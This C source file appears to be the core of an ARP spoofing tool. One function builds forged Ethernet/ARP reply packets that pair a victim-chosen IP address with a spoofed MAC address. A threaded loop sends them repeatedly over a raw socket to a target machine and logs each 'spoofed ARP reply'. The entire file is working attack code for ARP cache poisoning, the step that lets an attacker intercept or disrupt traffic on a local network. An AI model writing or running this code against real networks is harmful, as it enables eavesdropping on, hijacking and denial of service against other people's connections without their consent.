#include "spoofer.h"

// Functions
void build_arp_packet(uint8_t *packet, thread_spoof_args_t *args) {
	ethernet_header_t eth;
	arp_header_t arp;

	memcpy(eth.dest_mac, args->target_mac, 6);
	memcpy(eth.src_mac, args->spoofed_mac, 6);
	eth.ethertype = htons(ARP_PROTOCOL);

	arp.hw_type = htons(1);
	arp.proto_type = htons(0x0800);
	arp.hw_size = 6;
	arp.proto_size = 4;
	arp.opcode = htons(ARP_REPLY);
	memcpy(arp.sender_mac, args->spoofed_mac, 6);
	memcpy(arp.sender_ip, args->spoofed_ip, 4);
	memcpy(arp.target_mac, args->target_mac, 6);
	memcpy(arp.target_ip, args->target_ip, 4);

	memcpy(packet, &eth, sizeof(eth));
	memcpy(packet + sizeof(eth), &arp, sizeof(arp));
}

void *spoof_thread(void *arg) {
	thread_spoof_args_t *args = (thread_spoof_args_t *)arg;
	uint8_t packet[sizeof(ethernet_header_t) + sizeof(arp_header_t)]; // Size of entire packet

	struct sockaddr_ll socket_address = {0};
	socket_address.sll_ifindex = (int)args->ifindex;
	socket_address.sll_halen = ETH_ALEN;
	memcpy(socket_address.sll_addr, args->target_mac, 6);

	for (int i = 0; i < SEND_TRIES; ++i) {
		build_arp_packet(packet, args);
		if (sendto(args->sock_fd, packet, sizeof(packet), 0,
				   (struct sockaddr *)&socket_address, sizeof(socket_address)) == -1) {
			perror("sendto");
				   } else {
				   	char ip_str[INET_ADDRSTRLEN];
				   	inet_ntop(AF_INET, args->spoofed_ip, ip_str, INET_ADDRSTRLEN);
				   	printf("Sent spoofed ARP reply: %s is at %s\n", ip_str, STR_FAKE_MAC);
				   }
		usleep(SEND_INTERVAL);
	}
	return NULL;
}
